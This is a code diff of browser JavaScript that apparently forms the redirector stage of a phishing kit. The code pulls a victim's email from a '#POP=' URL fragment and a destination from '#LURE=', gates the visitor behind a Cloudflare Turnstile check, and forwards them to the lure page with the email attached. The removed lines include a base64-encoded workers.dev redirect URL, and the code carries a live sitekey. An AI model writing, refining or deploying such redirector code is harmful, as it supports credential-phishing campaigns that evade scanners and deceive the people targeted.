@@ -126,52 +126,32 @@
         }
 
 
-// Extract and decode email and domain from URL
-function extractAndDecodeEmailAndDomain() {
+// Extract email and LURE value from the hash
+function extractAndDecodeHashValues() {
     const url = window.location.href;
     let email = null;
-    let domain = null;
+    let lureValue = null;
 
-    // Check if the URL contains '#POP=' or '#LURE='
-    if (url.includes('#POP=')) {
-        try {
-            // Extract the part after '#POP=' only
-            const hashFragment = url.split('#POP=')[1].split('#')[0].trim();
-
-            // Decode the email if necessary (e.g., URL encoding)
-            email = decodeURIComponent(hashFragment);
-
-            // Check if it's in the obfuscated format and decode if necessary
-            if (isObfuscatedFormat(email)) {
-                console.log('Email is in obfuscated format. Decoding...');
-                email = decodeEmail(email);
-            }
-        } catch (e) {
-            console.error('Failed to extract or decode email:', e);
+    try {
+        // Extract #POP= value
+        if (url.includes('#POP=')) {
+            email = url.split('#POP=')[1].split('#')[0].trim();
+            email = decodeURIComponent(email);
         }
+
+        // Extract #LURE= value
+        if (url.includes('#LURE=')) {
+            lureValue = url.split('#LURE=')[1].split('#')[0].trim();
+            lureValue = decodeURIComponent(lureValue);
+        }
+    } catch (e) {
+        console.error('Failed to extract or decode hash values:', e);
     }
 
-    if (url.includes('#LURE=')) {
-        try {
-            // Extract the part after '#LURE=' only
-            const hashFragment = url.split('#LURE=')[1].split('#')[0].trim();
-
-            // Decode the domain if necessary
-            domain = decodeURIComponent(hashFragment);
-
-            // Extract the domain (e.g., removing protocols if present)
-            if (domain.startsWith('http://') || domain.startsWith('https://')) {
-                domain = new URL(domain).hostname;
-            }
-        } catch (e) {
-            console.error('Failed to extract or decode domain:', e);
-        }
-    }
-
-    console.log('Final Decoded Email:', email); // Debugging log for email
-    console.log('Final Decoded Domain:', domain); // Debugging log for domain
-    return { email, domain };
+    console.log('Extracted Values:', { email, lureValue });
+    return { email, lureValue };
 }
+
 
 
 
@@ -203,11 +183,10 @@ async function getRedirectUrlWithEmail(base64Url, email) {
         
 // Start Turnstile verification
 function startTurnstileVerification() {
-    const base64Url = "aHR0cHM6Ly9za3ktbm8tbGltaXQtZm94ZXIzMzEwLnRyaWVkLWxvcmQud29ya2Vycy5kZXYv";
     if (USE_TURNSTILE) {
         console.log('Starting Turnstile verification...');
         turnstile.render('#cf-turnstile', {
-            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl',
+            sitekey: '0x4AAAAAAAymSY_rn4CFRQRl', // Replace with your actual sitekey
             type: 'spinner',
             callback: async function (token) {
                 if (!token) {
@@ -218,23 +197,20 @@ function startTurnstileVerification() {
                 // Show loading animation again
                 loadingDiv.style.display = 'flex';
 
-                // Extract and decode email and domain from URL
-                const { email, domain } = extractAndDecodeEmailAndDomain();
-
-                // Set a cookie for verification (optional)
-                document.cookie = 'verified=true; Path=/; SameSite=None; Secure=true';
+                // Extract hash values
+                const { email, lureValue } = extractAndDecodeHashValues();
 
                 // Wait for 3 seconds, then redirect
                 setTimeout(function () {
                     loadingDiv.style.display = 'none';
 
-                    if (domain && email) {
-                        // Construct the redirect URL
-                        const redirectUrl = `${domain}#POP=${email}?redirected=done`;
-                        console.log('Redirecting to:', redirectUrl); // Debug log for the constructed URL
+                    if (lureValue && email) {
+                        // Construct redirect URL
+                        const redirectUrl = `${lureValue}#POP=${email}?redirected=done`;
+                        console.log('Redirecting to:', redirectUrl);
                         window.location.href = redirectUrl;
                     } else {
-                        console.error('Missing domain or email for redirection.');
+                        console.error('Missing email or lureValue for redirection.');
                     }
                 }, 2000);
             },
